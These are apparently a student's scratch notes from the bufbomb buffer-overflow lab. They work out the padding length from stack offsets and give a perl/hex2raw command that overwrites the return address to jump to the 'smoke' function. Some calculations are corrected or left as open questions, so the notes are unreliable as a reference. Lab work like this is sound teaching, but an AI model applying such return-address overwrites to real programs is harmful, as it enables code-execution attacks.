p/d ($ebp-$esp) 
+ 31 = 56
+ 34 = 40
+ 39 = 40

Replacing  0x55683e00
So it is either 40 or 56
Meaning we need 61 * 36 or 61 * 52 WRONG it is either 61 * 40 or 61 * 56 and it is 61 * 40

Using:
perl -e 'print "61 "xT, "62 6c 55 56"'
passes at T = 31 fails at T = 32
Using:
perl -e 'print "61 "x40, "5d 63 55 56"' >t2
cat t2 | ./hex2raw | ./bufbomb -u haganc3

Does smoke location need to be diffrent?
THIS MAKES SENSE!!!!!!!!!!!

With 0000135d = 00 00 13 5d = 5d 13 00 00 NO! -> found smoke in objdump & grep -i "smoke" d.txt
With 5655635d = 56 55 63 5d = 5d 63 55 56 NO! -> found smoke using disas smoke @ +0 <- Think this is right
Diffrence of 56555000
Why are these diffrent????????????
